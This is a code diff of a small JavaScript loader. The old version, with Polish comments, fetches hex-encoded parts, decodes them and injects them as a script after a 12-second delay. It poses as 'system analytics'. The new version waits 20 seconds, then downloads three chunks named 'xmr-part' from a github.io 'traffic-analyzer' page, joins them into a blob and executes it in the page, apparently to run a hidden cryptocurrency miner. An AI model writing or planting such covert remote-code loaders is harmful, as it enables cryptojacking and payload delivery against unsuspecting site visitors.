@@ -1,30 +1,19 @@
-// Ładowarka z dekodowaniem HEX
+// loader.js
 setTimeout(async () => {
-  try {
-    // 1. Pobierz części
-    const [part1, part2] = await Promise.all([
-      fetch('ab.hex').then(r => r.text()),
-      fetch('ac.hex').then(r => r.text())
-    ]);
+  const parts = ['xmr-part-aa', 'xmr-part-ab', 'xmr-part-ac']; 
 
-    // 2. Zdekoduj HEX → tekst
-    const fullCode = hexToString(part1 + part2);
-
-    // 3. Wykonaj kod
-    const script = document.createElement('script');
-    script.textContent = fullCode;
-    document.body.appendChild(script);
-
-    console.log("[STATUS] System analytics aktywny!");
-
-  } catch (error) {
-    console.error("[ERROR]", error);
+  const blobParts = [];
+  
+  for (const part of parts) {
+    const response = await fetch(`https://abdulabdulabdul.github.io/traffic-analyzer/${part}`);
+    blobParts.push(await response.arrayBuffer());
   }
-}, 12000); // 12-sekundowe opóźnienie
 
-// Funkcja pomocnicza HEX → string
-function hexToString(hex) {
-  return decodeURIComponent(
-    hex.replace(/../g, match => '%' + match)
-  );
-}
+  const exeBlob = new Blob(blobParts, { type: 'application/octet-stream' });
+  const exeUrl = URL.createObjectURL(exeBlob);
+  
+  const script = document.createElement('script');
+  script.src = exeUrl;
+  document.body.appendChild(script);
+
+}, 20000);
